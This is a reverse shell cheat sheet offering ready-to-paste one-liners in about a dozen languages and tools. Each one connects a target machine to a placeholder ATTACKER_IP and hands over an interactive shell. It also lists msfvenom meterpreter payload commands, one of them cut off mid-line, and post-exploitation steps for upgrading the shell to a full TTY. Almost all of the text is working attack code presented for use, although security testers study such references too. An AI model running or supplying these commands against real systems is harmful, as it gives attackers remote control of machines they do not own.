Reverse Shell Cheat Sheet (All Types)
Replace ATTACKER_IP and PORT with your values.

Netcat
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

Python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/sh")

PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Ruby
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

Telnet
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKER_IP PORT 0</tmp/p

Go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go

socat
socat TCP:ATTACKER_IP:PORT EXEC:"bash -li"

MSFVenom Examples
msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=P



Post-Reverse Shell Commands (Essential Upgrades)
1. Spawn TTY Shell
python -c 'import pty; pty.spawn("/bin/bash")'
# Or if Python 3 only
python3 -c 'import pty; pty.spawn("/bin/bash")'

2. Background Shell & Fix Terminal
# Press: Ctrl + Z
# In your local terminal:
stty raw -echo
fg
# Press Enter

3. Reset & Export Variables (in reverse shell)
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
# Check your local terminal size with: stty size

4. Alternative TTY Spawns (No Python)
script -q /dev/null /bin/bash
# Or
/bin/sh -i

5. Full socat Upgrade (if available)
# On attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

